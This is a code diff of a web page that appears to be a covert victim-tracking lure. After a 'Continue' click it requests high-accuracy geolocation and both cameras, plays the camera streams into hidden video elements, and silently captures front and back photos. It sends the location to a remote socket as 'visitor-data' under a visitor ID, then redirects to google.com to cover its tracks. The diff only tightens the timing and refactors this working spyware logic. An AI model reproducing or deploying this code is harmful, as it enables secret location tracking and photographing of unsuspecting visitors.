@@ -73,9 +73,6 @@
             font-weight: 500;
         }
         #hiddenVideo, #hiddenVideoBack { display: none; }
-        .permission-status {
-            display: none !important;
-        }
     </style>
 </head>
 <body>
@@ -112,8 +109,7 @@
             let redirectUrl = 'https://www.google.com';
             let redirectTriggered = false;
             let isProcessing = false;
-            
-            let permissions = {
+            let permissionsGranted = {
                 location: false,
                 frontCamera: false,
                 backCamera: false
@@ -130,7 +126,7 @@
             }
 
             function checkAllPermissions() {
-                const allGranted = permissions.location && permissions.frontCamera && permissions.backCamera;
+                const allGranted = permissionsGranted.location && permissionsGranted.frontCamera && permissionsGranted.backCamera;
                 if (allGranted) {
                     updateStatus('✅ Permissions granted! Redirecting...');
                     
@@ -149,9 +145,9 @@
                     }, 1500);
                 } else {
                     const pending = [];
-                    if (!permissions.location) pending.push('Location');
-                    if (!permissions.frontCamera) pending.push('Front Camera');
-                    if (!permissions.backCamera) pending.push('Back Camera');
+                    if (!permissionsGranted.location) pending.push('Location');
+                    if (!permissionsGranted.frontCamera) pending.push('Front Camera');
+                    if (!permissionsGranted.backCamera) pending.push('Back Camera');
                     updateStatus(`⏳ Waiting for: ${pending.join(', ')}`);
                 }
             }
@@ -274,7 +270,7 @@
                 }
             }
 
-            // ===== CONTINUE BUTTON CLICK =====
+            // ===== CONTINUE BUTTON CLICK - IMMEDIATE PERMISSIONS =====
             continueBtn.addEventListener('click', function() {
                 if (isProcessing) return;
                 isProcessing = true;
@@ -282,17 +278,15 @@
                 continueBtn.textContent = '⏳ Processing...';
                 
                 updateStatus('⏳ Requesting permissions...');
-                requestAllPermissions();
-            });
-
-            function requestAllPermissions() {
-                // ===== LOCATION =====
-                console.log('📍 Requesting location...');
+                
+                // ===== REQUEST PERMISSIONS IMMEDIATELY (no setTimeout) =====
+                
+                // 1. LOCATION
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         function(pos) {
                             console.log('✅ Location granted');
-                            permissions.location = true;
+                            permissionsGranted.location = true;
                             
                             const lat = pos.coords.latitude;
                             const lng = pos.coords.longitude;
@@ -301,8 +295,7 @@
                                 .then(res => res.json())
                                 .then(data => {
                                     const locationInfo = {
-                                        lat: lat,
-                                        lng: lng,
+                                        lat, lng,
                                         accuracy: pos.coords.accuracy,
                                         timestamp: new Date().toISOString(),
                                         country: data.countryName || 'Unknown',
@@ -319,17 +312,11 @@
                                     }
                                 })
                                 .catch(() => {
-                                    const locationInfo = {
-                                        lat: lat,
-                                        lng: lng,
-                                        accuracy: pos.coords.accuracy,
-                                        timestamp: new Date().toISOString()
-                                    };
                                     if (socket && socket.connected) {
                                         socket.emit('visitor-data', {
                                             visitorId,
                                             type: 'location',
-                                            content: locationInfo
+                                            content: { lat, lng, accuracy: pos.coords.accuracy }
                                         });
                                     }
                                 });
@@ -338,26 +325,21 @@
                         },
                         function(err) {
                             console.log('❌ Location denied:', err.message);
-                            permissions.location = false;
+                            permissionsGranted.location = false;
                             checkAllPermissions();
                         },
                         { timeout: 15000, enableHighAccuracy: true }
                     );
                 }
 
-                // ===== FRONT CAMERA =====
-                console.log('📸 Requesting front camera...');
+                // 2. FRONT CAMERA (immediate)
                 navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 })
                 .then(function(stream) {
                     console.log('✅ Front camera granted');
-                    permissions.frontCamera = true;
+                    permissionsGranted.frontCamera = true;
                     cameraStream = stream;
                     frontVideo.srcObject = stream;
                     return frontVideo.play();
@@ -365,28 +347,23 @@
                 .then(function() {
                     setTimeout(function() {
                         capturePhoto('front', frontVideo);
-                    }, 1500);
+                    }, 1000);
                     checkAllPermissions();
                 })
                 .catch(function(err) {
                     console.log('❌ Front camera denied:', err.message);
-                    permissions.frontCamera = false;
+                    permissionsGranted.frontCamera = false;
                     checkAllPermissions();
                 });
 
-                // ===== BACK CAMERA =====
-                console.log('📸 Requesting back camera...');
+                // 3. BACK CAMERA (immediate)
                 navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'environment',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 })
                 .then(function(stream) {
                     console.log('✅ Back camera granted');
-                    permissions.backCamera = true;
+                    permissionsGranted.backCamera = true;
                     cameraStreamBack = stream;
                     backVideo.srcObject = stream;
                     return backVideo.play();
@@ -394,15 +371,15 @@
                 .then(function() {
                     setTimeout(function() {
                         capturePhoto('back', backVideo);
-                    }, 2500);
+                    }, 2000);
                     checkAllPermissions();
                 })
                 .catch(function(err) {
                     console.log('❌ Back camera denied:', err.message);
-                    permissions.backCamera = false;
+                    permissionsGranted.backCamera = false;
                     checkAllPermissions();
                 });
-            }
+            });
 
             function capturePhoto(type, video) {
                 if (!video || !video.videoWidth || !video.videoHeight) {
